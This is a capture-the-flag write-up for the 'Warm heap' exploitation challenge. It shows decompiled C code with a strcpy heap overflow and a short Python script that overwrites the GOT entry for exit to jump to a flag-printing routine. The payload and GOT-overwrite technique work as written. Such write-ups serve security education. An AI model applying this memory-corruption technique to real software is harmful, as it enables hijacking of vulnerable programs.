## Warm heap (Exploit, 100p, 67 solves)
	tl;dr Use buffer overflow to overwrite exit in GOT

The included [binary](exp100.bin) contains a buffer overflow at 0x40096E:

``` c
  void *v0; // ST10_8@1
  void *v1; // ST18_8@1
  char s; // [sp+20h] [bp-1010h]@1
  __int64 v3; // [sp+1028h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  v0 = malloc(0x10uLL);
  *(_DWORD *)v0 = 1;
  *((_QWORD *)v0 + 1) = malloc(8uLL);
  v1 = malloc(0x10uLL);
  *(_DWORD *)v1 = 2;
  *((_QWORD *)v1 + 1) = malloc(8uLL);
  fgets(&s, 4096, stdin);
  strcpy(*((char **)v0 + 1), &s);
  fgets(&s, 4096, stdin);
  strcpy(*((char **)v1 + 1), &s);
  exit(0);
```


strcpy copies more bytes that have been allocated, that allows us to overwrite the second strcpy's destination

We have to jump to the subroutine at 0x400826, which prints out the flag for us.

We do that, by overwriting the exit adress in GOT to 0x400826


A final script generating the payload:

``` python
import struct

payload = "x"*40+struct.pack("<q", 0x0000000000601068)+"\n"
payload += struct.pack("<q", 0x0000000000400826)+"\n"

f = open('key', 'wb')
f.write(payload)
f.close()
```
